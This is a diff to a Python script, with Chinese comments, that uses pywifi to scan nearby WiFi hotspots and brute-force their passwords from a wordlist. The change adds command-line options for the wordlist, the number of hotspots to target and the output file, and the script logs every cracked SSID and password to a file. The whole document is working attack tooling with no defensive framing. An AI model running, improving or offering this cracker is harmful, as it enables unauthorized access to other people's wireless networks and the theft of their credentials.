@@ -1,26 +1,17 @@
+import os
 import random
 import math
 
 import pywifi
 from pywifi import const  # 引用一些定义
 
-from _util import *
+from _util import get_aps, crack_ap, classify_aps, sample_passwords
 
 
-def main():
-
-    print('[+]导入密码本')
-    passwords = []
-    with open('password.txt') as f:
-        for line in f:
-            passwords.append(line.strip())
-    if len(passwords) < 200:  # 起始的200个被认为是具有较高可能性的密码
-        p_passwords = passwords
-        r_passwords = []
-    else:
-        p_passwords = passwords[:200]
-        r_passwords = passwords[200:]
-    print('[-]成功导入密码本')
+def main(password_file, count=5, result_file='results.txt', stype=1):
+    if not os.path.isfile(password_file):
+        print('[!]密码本文件不存在')
+        return
 
     print('[+]获取网卡')
     wifi = pywifi.PyWiFi()  # 抓取网卡接口
@@ -34,7 +25,7 @@ def main():
 
     print('[+]扫描当前可用热点，并选出需要密码破解的热点')
     scanned_profiles = get_aps(
-        iface, count=5, filtered_ssids=saved_ssids)  # 扫描当前可用的热点
+        iface, count=count, filtered_ssids=saved_ssids)  # 扫描当前可用的热点
     needpwd_profiles, _ = classify_aps(scanned_profiles)  # 分开需要密码和不需要密码的热点
     print('[*]需要破解的热点为', [profile.ssid for profile in needpwd_profiles])
     print('[-]完成扫描')
@@ -42,6 +33,13 @@ def main():
     # 不需要密码的热点通常都是需要额外的验证操作的，由使用者自行把握
     # 只考虑需要密码的热点
     cracked_table = {}
+
+    print('[+]导入密码本')
+    passwords = []
+    with open(password_file) as f:
+        for line in f:
+            passwords.append(line.strip())
+    print('[-]成功导入密码本')
 
     print('[+]开始暴力破解')
 
@@ -51,20 +49,14 @@ def main():
 
         profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元 /cipher - AP的密码类型
 
-        if r_passwords:
-            t_passwords = p_passwords + \
-                random.sample(r_passwords, int(math.sqrt(len(r_passwords))))
-        else:
-            t_passwords = p_passwords
-
-        for key in t_passwords:
+        for key in sample_passwords(passwords, stype):
             print('[+]使用密码 %s 破解 %s' % (key, ssid))
 
             profile.key = key
 
             if crack_ap(iface, profile):
                 cracked_table[profile.ssid] = key
-                with open('crack_result.txt', 'a') as f:
+                with open(result_file, 'a') as f:
                     f.write('%s : %s\n' % (ssid, key))
                 print('[-]使用密码 %s 破解 %s成功' % (key, ssid))
                 break
@@ -76,13 +68,20 @@ def main():
     print('[*]破解出的密码表为', cracked_table)
     print('[-]暴力破解完成')
 
-    return cracked_table
-
 
 def __main__():
     import argparse
 
-    main()
+    parser = argparse.ArgumentParser(description='暴力破解信号强度考前的热点')
+    parser.add_argument('password_file', type=str, help='密码本文件')
+    parser.add_argument('-c', '--count', type=int, default=5, help='所要破解的热点个数，默认为破解5个')
+    parser.add_argument('--result_file', type=str,
+                        default='results.txt', help='保存所有热点密码结果文件')
+    parser.add_argument('-s', '--stype', type=int, default=1,
+                        help=sample_passwords.__doc__+"，默认为1")
+    args = parser.parse_args()
+
+    main(args.password_file, args.count, args.result_file, args.stype)
 
 
 if __name__ == '__main__':
